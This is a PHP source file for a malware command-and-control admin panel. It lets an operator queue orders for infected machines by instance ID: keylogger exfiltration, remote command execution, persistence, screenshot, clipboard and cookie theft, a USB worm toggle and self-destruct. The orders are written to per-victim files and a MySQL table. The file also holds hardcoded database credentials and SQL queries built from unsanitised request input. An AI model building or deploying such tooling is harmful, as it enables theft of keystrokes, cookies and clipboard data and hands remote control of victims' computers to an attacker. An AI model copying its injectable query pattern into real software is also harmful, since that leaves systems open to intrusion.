<?php
session_start();

if (!isset($_SESSION["username"])) {
    header("Location: admin.php");
    exit;
}

$userId = $_GET['id'];


//save to db
$servername = "localhost";
$username = "toor";
$password = "toor";
$dbname = "connections";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT * FROM states WHERE instance_id = '$userId' LIMIT 1";
$result = $conn->query($sql);
$data = $result->fetch_assoc();
$state_keylogger = $data['state_keylogger'];
$state_usbworm = $data['state_usbworm'];

if ($state_keylogger == "enabled"){
    $label_enabled_keylogger = "selected";
    $label_disabled_keylogger = "unselected";
    }
    else{
    $label_enabled_keylogger = "unselected";
    $label_disabled_keylogger = "selected";
    } 

if ($state_usbworm == "enabled"){
    $label_enabled_usbworm= "selected";
    $label_disabled_usbworm = "unselected";
    }
    else{
    $label_enabled_usbworm = "unselected";
    $label_disabled_usbworm = "selected";
    } 


if(isset($_POST['options'])){

    $options = $_POST['options'];
    
    $api = isset($_POST['api']) ? $_POST["api"] : null;

    include "config.php";
    if(isset($_POST['disable_USBworm']) || isset($_POST['enable_USBworm'])){
        $api_order_number = isset($_POST['disable_USBworm']) ? 10 : 9;
       }
       
       if(isset($_POST['disable_keylogger']) || isset($_POST['enable_keylogger'])){
        $api_order_number = isset($_POST['disable_keylogger']) ? 8 : 1;
       }
       if(!isset($_POST['disable_keylogger']) && !isset($_POST['enable_keylogger'])  && !isset($_POST['disable_USBworm']) && !isset($_POST['enable_USBworm']) && isset($commands_menu[$options])){
        $api_order_number = $commands_menu[$options];
        } 
    if(isset($_POST["api"]) && $options == "rce"){

        //build a reverse api into api.txt
        $api_order_number .= ":".trim($api);

    }

    //write to api.txt
    file_put_contents("api/api-".$userId.".txt", $api_order_number);

    if(isset($_POST['enable_keylogger'])){
        $state_keylogger = 'enabled';
    }
    
    if(isset($_POST['disable_keylogger'])){
        $state_keylogger = 'disabled';
    }
    
    if(isset($_POST['enable_USBworm'])){
        $state_usbworm = 'enabled';
    }
    
    if(isset($_POST['disable_USBworm'])){
        $state_usbworm = 'disabled';
    }
    


if ($result->num_rows > 0) {

   // Update state
    $sql = "UPDATE `states` SET `api`='$api_order_number',`state_keylogger`='$state_keylogger',`state_usbworm`='$state_usbworm' WHERE `instance_id`='$userId'";
    $conn->query($sql);

    
} else {
   //INSERT state
  
   $sql = "INSERT INTO `states`(`api`, `instance_id`,`state_usbworm`, `state_keylogger`) VALUES ('$api_order_number','$userId','$state_usbworm','$state_keylogger')";
   $result = $conn->query($sql);
}


}

$sql = "SELECT * FROM states WHERE instance_id = '$userId' LIMIT 1";
$result = $conn->query($sql);
$data = $result->fetch_assoc();
$state_keylogger = $data['state_keylogger'];
$state_usbworm = $data['state_usbworm'];

if ($state_keylogger == "enabled"){
    $label_enabled_keylogger = "selected";
    $label_disabled_keylogger = "unselected";
    }
    else{
    $label_enabled_keylogger = "unselected";
    $label_disabled_keylogger = "selected";
    } 

if ($state_usbworm == "enabled"){
    $label_enabled_usbworm= "selected";
    $label_disabled_usbworm = "unselected";
    }
    else{
    $label_enabled_usbworm = "unselected";
    $label_disabled_usbworm = "selected";
    } 


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <!-- Custom CSS -->
    <style>
        body {
            background-color: #f8f9fa;
        }

        .login-form {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .selected {
            background-color: green;
            color: white;
        }
        .unselected {
            background-color: red;
            color: white;
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="login-form">
            <h2 class="text-center">Admin Panel</h2>
            <form method="POST" action="">

                <div class="form-group">
                    <label for="options">Options</label>
                    <select name="options" id="options">
                        <option value="Exfiltrate_keylogger">Exfiltrate Keylogger</option>
                        <option value="rce">RCE</option>
                        <option value="Enable_Presistence">Enable Presistence</option>
                        <option value="screenshot">Exfiltrate Screenshot</option>
                        <option value="clipboard_steal">Exfiltrate Clipboard</option>
                        <option value="self_destroy">Self Destroy</option>
                        <option value="steal_cookies">Steal Cookies</option>
                    </select>
                </div>
                <div class="form-group">
                     <label for="keylogger" class="<?php echo $label_disabled_keylogger;?>">
                         <input type="radio" name="disable_keylogger"> Disable Keylogger
                     </label>
                     <label for="keylogger" class="<?php echo $label_enabled_keylogger;?>">
                         <input type="radio" name="enable_keylogger"> Enable Keylogger
                     </label>
                 </div>
                 <div class="form-group">
                     <label for="keylogger" class="<?php echo $label_disabled_usbworm;?>">
                         <input type="radio" name="disable_USBworm"> Disable USBworm
                     </label>
                     <label for="keylogger" class="<?php echo $label_enabled_usbworm;?>">
                         <input type="radio" name="enable_USBworm"> Enable USBworm
                     </label>
                 </div>

                <div class="form-group" id="apiInput" name="apiInput" style="display:none;">
                    <label for="api">Command</label>
                    <input type="text" class="form-control" id="api" name="api" placeholder="Enter command">
                </div>

                <button type="submit" class="btn btn-primary btn-block">Submit</button>
            </form>
        </div>
    </div>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        document.getElementById('options').addEventListener('change', function() {
            var inputapi = document.getElementById('apiInput');
            if (this.value === 'rce') {
                inputapi.style.display = 'block';
            } else {
                inputapi.style.display = 'none';
            }
        });

        document.getElementById("toggleButtonkeylogger").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default form submission behavior
        toggleButton("toggleButtonkeylogger");
    });
    document.getElementById("toggleButtonusb_worm").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default form submission behavior
        toggleButton("toggleButtonusb_worm");
    });
    function toggleButton(obj) {
        var button = document.getElementById(obj);
        if (button.classList.contains("off")) {
            button.classList.remove("off");
            button.classList.add("on");
            button.textContent = "On";
        } else {
            button.classList.remove("on");
            button.classList.add("off");
            button.textContent = "Off";
        }
        return false;
    }
</script>
    
</body>

</html>